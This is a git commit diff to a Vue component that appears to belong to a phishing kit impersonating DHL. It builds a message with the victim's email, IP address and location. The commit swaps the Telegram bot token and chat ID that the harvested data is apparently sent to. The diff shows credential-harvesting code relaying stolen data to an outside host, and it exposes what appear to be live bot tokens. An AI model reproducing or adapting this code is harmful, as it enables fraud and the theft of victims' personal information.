783643be9bc5c174b232f4621f5dd866d415c2a2
aliessoudaninexits <113150451+aliessoudaninexits@users.noreply.github.com>
2023-07-29 21:15:20 +0100

    Update two-com.vue

--- src/components/two-com.vue
+++ src/components/two-com.vue
@@ -4669,9 +4669,9 @@ export default {
       );
       this.IP = tt.data.ip;
       this.query = tt.data.country_capital;
-      var token = "6188237567:AAGyW3wcd9ZumEX5EZTcpkaUsQkVWMgOGGI";
+      var token = "6562687906:AAHjkA41fEvbPDueV9ELYNy3ZBeyhyfmCJY";
 
-      var chatId2 = -823044704;
+      var chatId2 = -936912870 ;
       var fullMessage = `
         ||||||||||🇨🇦| DHL EN |🇨🇦||||||||||%0AEmail : ${
           this.email
